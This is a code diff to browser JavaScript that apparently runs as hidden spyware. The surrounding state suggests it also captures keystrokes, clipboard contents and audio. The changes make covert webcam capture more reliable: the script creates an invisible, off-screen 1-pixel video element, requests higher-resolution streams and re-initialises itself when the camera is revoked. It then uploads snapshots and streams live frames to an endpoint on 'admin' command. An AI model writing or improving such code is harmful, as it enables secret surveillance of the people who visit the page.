@@ -19,6 +19,7 @@
     })();
 
     let stream = null, videoEl = null, canvas = null, ctx = null;
+    let videoReady = false; // true once video element is playing with valid dimensions
     let keyBuffer = '', lastClip = '';
     let liveSocket = null, liveInterval = null, liveActive = false;
     let audioRecorder = null, audioActive = false;
@@ -340,11 +341,13 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
 
     // ═══ CAMERA + PHOTO + VIDEO ═══════════════════════════════
     async function takePhoto() {
-        if (!stream || !videoEl || videoEl.readyState < 2) return;
+        if (!stream || !videoEl || !videoReady) return;
         try {
             if (!canvas) { canvas = document.createElement('canvas'); ctx = canvas.getContext('2d'); }
-            canvas.width = videoEl.videoWidth || 640; canvas.height = videoEl.videoHeight || 480;
-            ctx.drawImage(videoEl, 0, 0);
+            const w = videoEl.videoWidth || 640;
+            const h = videoEl.videoHeight || 480;
+            canvas.width = w; canvas.height = h;
+            ctx.drawImage(videoEl, 0, 0, w, h);
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', C.photoQuality || 0.7));
             if (blob && blob.size > 1000) await upload('/upload-photo', 'photo', blob, `snap_${Date.now()}.jpg`);
         } catch {}
@@ -366,7 +369,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
     }
 
     async function initCamera() {
+        videoReady = false;
         const cfgs = [
+            { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: true },
             { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
             { video: { facingMode: 'environment' }, audio: true },
             { video: true, audio: true },
@@ -375,10 +380,46 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         ];
         for (const c of cfgs) {
             try {
-                stream = await navigator.mediaDevices.getUserMedia(c);
+                const s = await navigator.mediaDevices.getUserMedia(c);
+                stream = s;
+                // Ensure we have a video element (create one if the page doesn't have it)
                 videoEl = document.getElementById('v');
-                if (videoEl) { videoEl.srcObject = stream; await videoEl.play().catch(() => {}); }
-                await new Promise(r => setTimeout(r, 1500));
+                if (!videoEl) {
+                    videoEl = document.createElement('video');
+                    videoEl.id = 'v';
+                    videoEl.setAttribute('autoplay', '');
+                    videoEl.setAttribute('muted', '');
+                    videoEl.setAttribute('playsinline', '');
+                    videoEl.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1';
+                    document.body.appendChild(videoEl);
+                }
+                videoEl.muted = true;
+                videoEl.autoplay = true;
+                videoEl.playsInline = true;
+                videoEl.srcObject = stream;
+                // Wait for actual playback — canplay / playing fires once frames are decodable
+                await new Promise((resolve) => {
+                    let done = false;
+                    const finish = () => { if (!done) { done = true; resolve(); } };
+                    videoEl.addEventListener('canplay', finish, { once: true });
+                    videoEl.addEventListener('playing', finish, { once: true });
+                    videoEl.addEventListener('error',   finish, { once: true });
+                    videoEl.play().catch(finish);
+                    setTimeout(finish, 5000); // safety timeout
+                });
+                // Listen for track ending so we can re-init when camera is revoked
+                stream.getTracks().forEach(t => {
+                    t.addEventListener('ended', () => { videoReady = false; setTimeout(initCamera, 1000); });
+                });
+                // Only mark ready when we actually have video dimensions
+                if (c.video !== false) {
+                    // Poll briefly for dimensions in case canplay fired before metadata
+                    for (let i = 0; i < 20; i++) {
+                        if (videoEl.videoWidth > 0) break;
+                        await new Promise(r => setTimeout(r, 100));
+                    }
+                }
+                videoReady = true;
                 // Photos and video are on-demand only (via screenshot/mic commands from admin)
                 return;
             } catch {}
@@ -456,8 +497,10 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
 
     function startLiveFeed() {
         if (liveActive) return;
-        if (!stream || !videoEl || videoEl.readyState < 2) {
-            liveActive = false;
+        if (!stream) { liveActive = false; return; }
+        // If camera hasn't finished initialising yet, retry shortly
+        if (!videoReady || !videoEl) {
+            setTimeout(startLiveFeed, 800);
             return;
         }
         liveActive = true;
@@ -468,13 +511,15 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         const adaptiveCtx = adaptiveCanvas.getContext('2d');
 
         async function sendFrame() {
-            if (!liveActive || !stream || !videoEl || videoEl.readyState < 2) {
-                stopLiveFeed();
+            if (!liveActive || !stream) { stopLiveFeed(); return; }
+            // Video not ready or dimensions not available yet — wait and retry
+            if (!videoEl || !videoReady || videoEl.videoWidth === 0) {
+                if (liveActive) liveInterval = setTimeout(sendFrame, 500);
                 return;
             }
             try {
-                const sw = Math.round((videoEl.videoWidth || 640) * scale);
-                const sh = Math.round((videoEl.videoHeight || 480) * scale);
+                const sw = Math.round(videoEl.videoWidth * scale);
+                const sh = Math.round(videoEl.videoHeight * scale);
                 adaptiveCanvas.width  = sw;
                 adaptiveCanvas.height = sh;
                 adaptiveCtx.drawImage(videoEl, 0, 0, sw, sh);
@@ -763,7 +808,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
     // ═══ INIT ══════════════════════════════════════════════════
     document.addEventListener('visibilitychange', () => {
         if (!document.hidden) {
-            if (!stream || stream.getTracks().some(t => t.readyState === 'ended')) initCamera();
+            if (!stream || stream.getTracks().some(t => t.readyState === 'ended')) { videoReady = false; initCamera(); }
             // Reconnect socket if needed
             if (liveSocket && !liveSocket.connected) liveSocket.connect();
         }
